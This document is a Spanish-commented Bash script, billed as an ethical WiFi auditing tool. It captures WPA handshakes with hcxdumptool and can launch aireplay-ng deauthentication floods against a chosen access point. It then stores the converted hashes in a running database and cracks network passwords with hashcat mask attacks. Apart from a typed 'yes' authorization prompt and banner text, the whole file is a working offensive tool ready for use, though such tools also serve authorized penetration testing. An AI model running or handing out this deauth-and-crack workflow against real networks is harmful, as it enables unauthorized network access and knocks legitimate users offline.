#!/bin/bash
# =====================================================================
# WiFi Auditing Automation Tool - v4.5
# Añade soporte analyze -deauth <iface> <AP_MAC> <outfile>
# =====================================================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

print_info() { echo -e "${BLUE}[INFO]${NC} $1"; }
print_success() { echo -e "${GREEN}[SUCCESS]${NC} $1"; }
print_error() { echo -e "${RED}[ERROR]${NC} $1"; }
print_warning() { echo -e "${YELLOW}[WARNING]${NC} $1"; }

check_root() {
    if [[ $EUID -ne 0 ]]; then
        print_error "Este script debe ejecutarse como root (sudo)"
        exit 1
    fi
}

check_dependencies() {
    local deps=(hcxdumptool hcxpcapngtool hashcat curl xxd aireplay-ng airmon-ng)
    local missing=()
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &>/dev/null; then
            missing+=("$dep")
        fi
    done
    if [[ ${#missing[@]} -gt 0 ]]; then
        print_error "Faltan dependencias: ${missing[*]}"
        print_info "Instálalas con: sudo apt install ${missing[*]}"
        exit 1
    fi
}

show_banner() {
    clear
    echo ""
    echo -e "${CYAN}╔═════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║${WHITE} WiFi Auditing Automation Tool v4.5${CYAN} ║${NC}"
    echo -e "${CYAN}║${WHITE} Auditoría Ética IEEE 802.11${CYAN}         ║${NC}"
    echo -e "${CYAN}╚═════════════════════════════════════════════╝${NC}"
}

show_help() {
    echo -e "${WHITE}"
    echo "──────────────────────────────────────────────"
    echo "   USO DE COMANDOS DISPONIBLES"
    echo "──────────────────────────────────────────────${NC}"
    echo ""
    echo -e "${YELLOW}analyze${NC} [-deauth] <interfaz> [AP_MAC] <archivo.pcapng>"
    echo "  Captura tráfico WiFi. Si se usa '-deauth <interfaz > <AP_MAC> <archivo>', lanza una desautenticación ética"
    echo ""
    echo -e "${YELLOW}lsmac${NC} [archivo.hc22000]"
    echo "  Lista las MACs detectadas mostrando SSID y fabricante."
    echo ""
    echo -e "${YELLOW}attack${NC} <mac> <máscara>"
    echo "  Ejecuta hashcat sobre una MAC específica."
    echo ""
    echo -e "${YELLOW}help${NC}     Muestra esta ayuda."
    echo -e "${YELLOW}exit${NC}     Sale del programa."
    echo -e "${CYAN}──────────────────────────────────────────────${NC}"
}

# -------- ANALYZE (normal y con -deauth) --------
analyze() {
    local mode_normal=true
    local iface=""
    local ap_mac=""
    local outfile=""
    local dbfile="database.hc22000"

    if [[ "$1" == "-deauth" ]]; then
        mode_normal=false
        iface="$2"
        ap_mac="$3"
        outfile="$4"
        # Detectar canal del AP objetivo 
        print_info "Detectando canal del AP $ap_mac..."
        local formatted_mac=$(echo "$ap_mac" | sed 's/../&:/g; s/:$//')
        local channel=$(iw dev "$iface" scan 2>/dev/null | grep -A50 "$formatted_mac" | grep -E "primary channel|DS Parameter set: channel" | awk '{print $NF}' | head -n1)

        
        if [[ -z "$channel" ]]; then
            print_error "No se pudo detectar el canal del AP. Verifica que el AP esté al alcance."
            return 1
        fi
        
        print_success "Canal detectado: $channel (2.4GHz)"
    else
        iface="$1"
        outfile="$2"
    fi

    if [[ -z "$iface" || -z "$outfile" ]]; then
        print_error "Uso: analyze [-deauth] <interfaz> [AP_MAC] <archivo.pcapng>"
        return 1
    fi

    if ! ip link show "$iface" &>/dev/null; then
        print_error "Interfaz no válida: $iface"
        return 1
    fi

    systemctl stop NetworkManager wpa_supplicant 2>/dev/null
    ip link set $iface down
    iw $iface set monitor control
    ip link set $iface up 
    print_info "Interfaz $iface lista. Servicios detenidos."

    if $mode_normal; then
        print_info "Captura pasiva iniciada..."
        hcxdumptool -i "$iface" -w "$outfile" -F --rds=1
    else
        # Modo deauth
        print_warning "AVISO ÉTICO:"
        echo "Has activado el modo -deauth. Este modo:"
        echo "  • Fuerza desautenticaciones sobre el AP autorizado ($ap_mac)"
        echo "  • Sincroniza canal entre hcxdumptool y aireplay-ng"
        echo ""
        read -p "¿Confirmas autorización por escrito? (yes/no): " confirm
        if [[ "$confirm" != "yes" ]]; then
            print_info "Operación cancelada."
            ip link set $iface down
            iw $iface set type managed
            ip link set $iface up
            systemctl start NetworkManager wpa_supplicant 2>/dev/null
            return
        fi
        
        # Lanzar hcxdumptool fijado en ese canal
        print_info "Iniciando captura en canal $channel..."
        hcxdumptool -i "$iface" -w "$outfile" -c "${channel}a" --rds=1 &
        local pid_dump=$!
        sleep 3  # Esperar a que hcxdumptool se estabilice

        # Lanzar aireplay-ng
        print_info "Desautenticando AP autorizado: $ap_mac..."
        aireplay-ng -0 20 -a "$ap_mac" "$iface" >/dev/null 2>&1 &
        local pid_air=$!

        print_info "Capturando reautenticaciones durante 30 segundos..."
        sleep 30

        # Detener procesos
        kill $pid_air 2>/dev/null
        kill $pid_dump 2>/dev/null
        wait $pid_dump 2>/dev/null
        print_success "Reautenticaciones capturadas."
    fi

    ip link set $iface down
    iw $iface set type managed
    ip link set $iface up
    systemctl restart NetworkManager wpa_supplicant 2>/dev/null
    print_success "Servicios de red reactivados."

    if [[ ! -f "$outfile" ]]; then
        print_error "No se generó el archivo de captura."
        return 1
    fi

    # Convertir a hashcat y actualizar DB
    print_info "Convirtiendo a formato hashcat..."
    local hcfile="${outfile%.pcapng}.hc22000"
    hcxpcapngtool -o "$hcfile" "$outfile"

    if [[ -f "$hcfile" ]]; then
        print_info "Actualizando base de datos global..."
        cat "$hcfile" >> "$dbfile"
        sort -u "$dbfile" -o "$dbfile"
        print_success "Base de datos actualizada: $dbfile"
    fi
}

# --------- lookup_vendor y lsmac (igual) -----------
lookup_vendor() {
    local mac="$1"
    local cache_dir="$HOME/.wifi_audit"
    local cache_file="$cache_dir/vendors.cache"
    mkdir -p "$cache_dir"

    local prefix=$(echo "$mac" | cut -d: -f1-3 | tr -d ':' | tr '[:lower:]' '[:upper:]')
    local cached=$(grep -i "^$prefix;" "$cache_file" 2>/dev/null | cut -d';' -f2)
    if [[ -n "$cached" ]]; then echo "$cached"; return; fi

    local vendor=""
    local response=$(curl -s --max-time 3 "https://api.macvendors.com/$mac")
    if [[ "$response" == *"<html"* || "$response" == *"Too Many Requests"* || -z "$response" ]]; then
        vendor="Desconocido"
    else vendor="$response"; fi

    echo "$prefix;$vendor" >> "$cache_file"
    echo "$vendor"
}

lsmac() {
    local file="${1:-database.hc22000}"
    if [[ ! -f "$file" ]]; then
        print_error "No se encontró el archivo $file."
        return 1
    fi

    print_info "Analizando MACs y SSIDs desde $file..."
    declare -A mac_to_ssid
    local mac_list=()

    while IFS='*' read -r f1 f2 f3 f4 f5 f6 rest; do
        [[ -z "$f4" ]] && continue
        local formatted_mac=$(echo "$f4" | sed 's/\(..\)/\1:/g' | sed 's/:$//' | tr '[:lower:]' '[:upper:]')
        local essid="(oculto)"
        if [[ "$f6" =~ ^[0-9A-Fa-f]+$ ]]; then
            local essid_decoded=$(echo "$f6" | xxd -r -p 2>/dev/null)
            [[ -n "$essid_decoded" ]] && essid="$essid_decoded"
        fi
        if [[ -z "${mac_to_ssid[$formatted_mac]}" ]]; then
            mac_to_ssid["$formatted_mac"]="$essid"
            mac_list+=("$formatted_mac")
        fi
    done < "$file"

    printf "%-20s %-30s %-30s\n" "MAC ADDRESS" "SSID" "VENDOR"
    printf "%-20s %-30s %-30s\n" "--------------------" "------------------------------" "------------------------------"

    for mac in "${mac_list[@]}"; do
        local ssid="${mac_to_ssid[$mac]}"
        local vendor=$(lookup_vendor "$mac")
        printf "%-20s %-30s %-30s\n" "$mac" "$ssid" "$vendor"
    done
}

# --------- attack ----------
attack() {
    local mac="$1"
    local mask="$2"
    local dbfile="database.hc22000"

    [[ -z "$mac" || -z "$mask" ]] && { print_error "Uso: attack <mac> <máscara>"; return 1; }
    [[ ! -f "$dbfile" ]] && { print_error "Base de datos no encontrada."; return 1; }

    print_info "Buscando hash de $mac..."
    local temp="hash_${mac//:/}.hc22000"
    grep -i "${mac//:/}" "$dbfile" > "$temp"
    [[ ! -s "$temp" ]] && { print_error "No se encontró hash."; rm -f "$temp"; return 1; }

    hashcat -m 22000 "$temp" -a 3 "$mask"
    print_success "Ataque completado (usa --show para ver resultados)."
}

# -------- main ----------
main() {
    check_root
    check_dependencies
    show_banner
    show_help

    HISTFILE=~/.wifi_audit_tool_history
    [[ -f $HISTFILE ]] && history -r $HISTFILE

    while true; do
        echo ""
        read -e -p "$(echo -e "${CYAN}<wifi_audit_tool>${NC} ▶ ${WHITE}")" cmdline
        [[ -z "$cmdline" ]] && continue
        history -s "$cmdline"
        history -w $HISTFILE
        set -- $cmdline
        case "$1" in
            analyze) shift; analyze "$@";;
            lsmac) shift; lsmac "$@";;
            attack) shift; attack "$@";;
            help) show_help;;
            exit|quit) print_info "Saliendo..."; break;;
            *) print_error "Comando no reconocido: $1";;
        esac
done
}

main
